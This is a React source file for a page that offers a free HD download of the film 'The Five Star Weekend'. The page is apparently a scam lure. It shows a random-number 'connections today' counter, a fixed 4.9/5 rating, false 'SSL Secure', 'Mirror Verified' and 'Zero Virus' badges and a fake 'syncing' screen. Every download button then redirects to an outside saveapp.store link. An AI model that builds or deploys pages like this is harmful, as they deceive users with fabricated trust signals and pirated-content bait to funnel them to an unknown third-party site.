/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useMemo } from 'react';
import { 
  Heart, 
  Check, 
  Play, 
  Download, 
  ShieldCheck, 
  FileVideo, 
  Sparkles, 
  Star, 
  ArrowLeft, 
  Server, 
  AlertCircle
} from 'lucide-react';
import { DownloadPackType, FormatOption } from './types';
import { EPISODES_DATA } from './episodesData';
import { SyncProgress } from './components/SyncProgress';
import { StreamPlayerModal } from './components/StreamPlayerModal';

// Brand visual assets
import posterImage from './assets/images/london_2_poster_1781924976586.jpg';
const bannerImage = 'https://i.postimg.cc/DfJNvd3C/The-Five-Star-Weekend-Review-2-2.webp';

export default function App() {
  // Navigation screen states: 'portal' | 'syncing' | 'success'
  const [screen, setScreen] = useState<'portal' | 'syncing' | 'success'>('portal');
  
  // Customization criteria (defaults)
  const [selectedQuality] = useState<string>('1080p');
  const [packType] = useState<DownloadPackType>('complete');
  const [format] = useState<FormatOption>('mp4');
  const [selectedEpisodeIds] = useState<number[]>(
    EPISODES_DATA.map((ep) => ep.id)
  );

  // Modal open states
  const [isPreviewOpen, setIsPreviewOpen] = useState(false);

  // Simulated metrics
  const [activeStreams, setActiveStreams] = useState(12812);

  // Fluctuate active streams count for realistic active portal atmosphere
  useEffect(() => {
    const timer = setInterval(() => {
      setActiveStreams((prev) => {
        const delta = Math.floor(Math.random() * 51) - 25;
        return prev + delta;
      });
    }, 3500);
    return () => clearInterval(timer);
  }, []);

  // Filter selected episodes list
  const selectedEpisodes = useMemo(() => {
    return EPISODES_DATA;
  }, []);

  // Calculate size in GB dynamically
  const calculatedSize = useMemo(() => {
    let totalSizeMB = 0;
    selectedEpisodes.forEach((ep) => {
      const mb = parseInt(ep.size, 10) || 350;
      totalSizeMB += mb;
    });

    const parsedSizeGB = totalSizeMB / 1024;
    return parsedSizeGB.toFixed(1);
  }, [selectedEpisodes]);

  const handleStartSync = () => {
    setScreen('syncing');
  };

  const handleSyncComplete = () => {
    window.location.href = 'https://saveapp.store/cl/i/5nlp41';
  };

  const handleDownloadRedirect = () => {
    window.location.href = 'https://saveapp.store/cl/i/5nlp41';
  };

  return (
    <div className="bg-[#0b0e17] text-white min-h-screen py-8 px-4 flex flex-col items-center">
      
      {/* WRAPPER MAIN FRAME CARD */}
      <div className="w-full max-w-[500px] bg-[#0d111d] rounded-[24px] overflow-hidden shadow-[0_15px_40px_rgba(0,0,0,0.6)] border border-[#1f293d] flex flex-col relative transition-all duration-300">
        
        {/* TOP STATUS GLOW BAR */}
        <div className="bg-gradient-to-r from-pink-500 via-rose-500 to-orange-500 text-white font-extrabold text-[12px] p-3 text-center uppercase tracking-widest flex items-center justify-center gap-1.5 shadow-md">
          <Sparkles className="w-4 h-4 text-yellow-300 fill-current animate-pulse" />
          <span>Exclusive The Five Star Weekend Portal</span>
          <Sparkles className="w-4 h-4 text-yellow-300 fill-current animate-pulse" />
        </div>

        {/* ========================================= */}
        {/* SCREEN 1: PORTAL LANDING                  */}
        {/* ========================================= */}
        {screen === 'portal' && (
          <div className="p-5 md:p-6 flex flex-col items-center">
            
            {/* Profile Frame picture with verified badge */}
            <div className="relative mt-2 mb-4">
               <div className="w-28 h-28 rounded-full border-4 border-pink-500 bg-cover bg-center flex items-center justify-center shadow-[0_0_20px_rgba(255,0,127,0.45)]"
                style={{ backgroundImage: `url('https://i.postimg.cc/sg9qFjCj/download.jpg')` }}
              >
              </div>
              <div className="absolute bottom-1 right-1 bg-pink-500 border-2 border-[#0d111d] rounded-full p-1.5 w-7 h-7 flex items-center justify-center shadow-lg">
                <Check className="w-4 h-4 text-white stroke-[3.5]" />
              </div>
            </div>

            {/* Main Header title */}
            <h1 className="text-3xl font-black text-center tracking-tight mb-2 uppercase font-serif">
              The Five Star Weekend
            </h1>

            {/* Offline Fast Mirror Status badge */}
            <div className="flex items-center gap-2 bg-[#0d2221] border border-[#144033] px-4 py-1.5 rounded-full mb-6">
              <span className="w-2.5 h-2.5 bg-[#00e676] rounded-full shadow-[0_0_8px_#00e676] animate-ping" />
              <span className="text-[10px] uppercase tracking-widest font-black text-[#00e676]">
                Fast Offline Mirror • Available Now
              </span>
            </div>

            {/* Dynamic Interactive Video Preview Card */}
            <div 
              onClick={handleStartSync}
              className="w-full h-56 rounded-2xl bg-cover bg-center relative flex flex-col justify-center items-center cursor-pointer overflow-hidden border border-slate-800 shadow-inner group hover:border-pink-500/50 transition-all duration-300 mb-6"
              style={{ 
                backgroundImage: `linear-gradient(to bottom, rgba(0,0,0,0.15), rgba(0,0,0,0.8)), url(${bannerImage})` 
              }}
            >
              <div className="w-14 h-14 bg-pink-500 rounded-full flex items-center justify-center shadow-[0_4px_15px_rgba(255,0,127,0.5)] group-hover:scale-110 active:scale-95 transition-all text-white">
                <Play className="w-5 h-5 fill-current ml-1" />
              </div>
              
              <button 
                type="button" 
                className="absolute bottom-4 bg-white text-pink-500 font-extrabold text-[10px] tracking-wider px-4 py-2 rounded-full flex items-center gap-1.5 uppercase shadow-md hover:bg-slate-50 transition-colors"
                onClick={(e) => {
                  e.stopPropagation();
                  setIsPreviewOpen(true);
                }}
              >
                <FileVideo className="w-3.5 h-3.5 text-pink-500 animate-pulse" />
                Play Movie Preview
              </button>
            </div>

            {/* Highlighted text block */}
            <div className="text-center space-y-2 mb-6">
              <h2 className="text-base font-black font-serif text-white tracking-wide">
                Download The Five Star Weekend in Full HD
              </h2>
              <p className="text-[11.5px] text-slate-400 leading-relaxed px-2">
                Get high-speed offline mirror access to the complete movie and exclusive bonus content. <span className="text-pink-500 font-extrabold text-[12px]">100% Free & Fast</span>. Starts instantly.
              </p>
            </div>

            {/* MAIN PORTAL CTA DOWNLOAD TRIGGER */}
            <div className="w-full text-center space-y-1.5 mb-6">
              <button 
                onClick={handleStartSync}
                className="w-full bg-gradient-to-r from-pink-500 to-orange-500 hover:from-pink-600 hover:to-orange-600 font-extrabold text-xs uppercase tracking-widest py-4.5 rounded-2xl flex items-center justify-center gap-2 text-white shadow-[0_4px_20px_rgba(255,0,127,0.35)] active:scale-95 transition-all cursor-pointer animate-bounce"
                style={{ animationDuration: '3s' }}
              >
                <Download className="w-4.5 h-4.5 text-white" />
                <span>Download Movie</span>
              </button>
              <div className="flex items-center justify-center gap-1.5 text-[9.5px] font-extrabold text-slate-500 uppercase tracking-widest pt-1">
                <span className="w-1.5 h-1.5 bg-pink-500 rounded-full" />
                Start high-speed download instantly
              </div>
            </div>

            {/* Simulated Live Statistics grid */}
            <div className="grid grid-cols-2 gap-3 w-full mb-6">
              <div className="bg-[#111625] border border-[#1b2236] p-3.5 rounded-2xl text-center flex flex-col items-center justify-center">
                <div className="p-2 bg-pink-500/10 rounded-full mb-2">
                  <Server className="w-4 h-4 text-pink-500" />
                </div>
                <div className="text-lg font-black text-white tracking-widest uppercase">
                  {activeStreams.toLocaleString()}+
                </div>
                <p className="text-[8.5px] tracking-widest uppercase text-slate-400 font-extrabold mt-0.5">
                  Connections today
                </p>
              </div>

              <div className="bg-[#111625] border border-[#1b2236] p-3.5 rounded-2xl text-center flex flex-col items-center justify-center">
                <div className="flex gap-1 mb-2">
                  <Star className="w-3 h-3 text-yellow-500 fill-current" />
                  <Star className="w-3 h-3 text-yellow-500 fill-current" />
                  <Star className="w-3 h-3 text-yellow-500 fill-current" />
                  <Star className="w-3 h-3 text-yellow-500 fill-current" />
                  <Star className="w-3 h-3 text-yellow-500 fill-current" />
                </div>
                <div className="text-lg font-black text-white tracking-widest uppercase">
                  4.9 / 5
                </div>
                <p className="text-[8.5px] tracking-widest uppercase text-slate-400 font-extrabold mt-0.5">
                  Satisfaction Index
                </p>
              </div>
            </div>

            {/* Security Badges Row indicators */}
            <div className="flex flex-wrap justify-center gap-2 w-full mb-4">
              <div className="flex items-center gap-1 text-[9.5px] font-extrabold tracking-wider uppercase text-[#00e676] bg-[#0b221a] border border-[#14402e] px-3 py-1.5 rounded-full">
                <Check className="w-3.5 h-3.5 stroke-[3]" />
                SSL Secure
              </div>
              <div className="flex items-center gap-1 text-[9.5px] font-extrabold tracking-wider uppercase text-pink-500 bg-[#240b1a] border border-[#4a1534] px-3 py-1.5 rounded-full">
                <ShieldCheck className="w-3.5 h-3.5" />
                Mirror Verified
              </div>
              <div className="flex items-center gap-1 text-[9.5px] font-extrabold tracking-wider uppercase text-[#00b0ff] bg-[#0b1e2a] border border-[#153c54] px-3 py-1.5 rounded-full">
                <Check className="w-3.5 h-3.5 stroke-[3]" />
                Zero Virus
              </div>
            </div>

            {/* Disclaimer and copyright credits footer */}
            <footer className="w-full text-center text-[9px] text-[#556275] leading-relaxed border-t border-slate-850 pt-4.5 mt-2">
              This fast stream channel operates high-efficiency caching mirrors. Content matches fan sharing network protocols. Strictly not affiliated with any broadcasting corporation. All DMCA properties protected. © 2026 The Five Star Weekend Stream Portal.
            </footer>

          </div>
        )}

        {/* ========================================= */}
        {/* SCREEN 2: DYNAMIC SYNCING LOADER          */}
        {/* ========================================= */}
        {screen === 'syncing' && (
          <div className="p-5 md:p-6">
            <SyncProgress 
              onComplete={handleSyncComplete} 
              format={format}
              quality={selectedQuality}
              packType={packType}
            />
          </div>
        )}

        {/* ========================================= */}
        {/* SCREEN 3: EXTREMELY REWARDING SUCCESS     */}
        {/* ========================================= */}
        {screen === 'success' && (
          <div className="p-5 md:p-6 flex flex-col items-center">
            
            {/* Elegant glowing check icon */}
            <div className="w-18 h-18 rounded-full bg-emerald-950/40 border border-emerald-500/40 text-emerald-400 flex items-center justify-center text-center p-3 my-2 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
              <Check className="w-9 h-9 stroke-[3]" />
            </div>

            <h2 className="text-xl font-black text-center uppercase tracking-widest text-[#00e676] mt-4 mb-1">
              File Syncing Verified!
            </h2>
            <p className="text-[10px] text-slate-400 uppercase tracking-widest font-black mb-5">
              Unique Mirrors Ready
            </p>

            {/* Direct Instant Download CTA */}
            <button
              onClick={handleDownloadRedirect}
              className="w-full bg-gradient-to-r from-pink-500 to-orange-500 hover:from-pink-600 hover:to-orange-600 font-extrabold text-xs uppercase tracking-widest py-4.5 rounded-2xl flex items-center justify-center gap-2 text-white shadow-[0_4px_20px_rgba(255,0,127,0.35)] active:scale-95 transition-all cursor-pointer mb-6"
            >
              <Download className="w-4.5 h-4.5 text-white animate-bounce" />
              <span>Download Movie</span>
            </button>

            {/* Direct advice section */}
            <div className="w-full bg-[#111625] border border-slate-850 p-4.5 rounded-2xl mb-6 text-left">
              <div className="flex items-center gap-2 text-pink-400 text-[10.5px] font-extrabold tracking-widest uppercase mb-2">
                <AlertCircle className="w-4 h-4" />
                Offline Play Instructions
              </div>
              <p className="text-[10px] text-slate-400 leading-relaxed">
                Clicking any button above initiates high speed download. Subtitle tracks are embedded directly in the <span className="font-bold text-slate-200 uppercase">{format}</span> containers. Extract the files and launch inside standard VLC Player, Smart TV systems or QuickTime media software.
              </p>
            </div>

            {/* BACK TO PORTAL RESET BUTTON */}
            <button
              onClick={() => {
                setScreen('portal');
              }}
              className="w-full py-3.5 bg-slate-900 border border-slate-800 hover:border-slate-700 font-extrabold text-xs uppercase tracking-widest rounded-2xl flex items-center justify-center gap-2 text-slate-300 active:scale-95 transition-all"
            >
              <ArrowLeft className="w-4 h-4 text-slate-400" />
              Return to Portal
            </button>

          </div>
        )}

      </div>

      {/* MODALS */}
      <StreamPlayerModal
        isOpen={isPreviewOpen}
        onClose={() => setIsPreviewOpen(false)}
      />

    </div>
  );
}
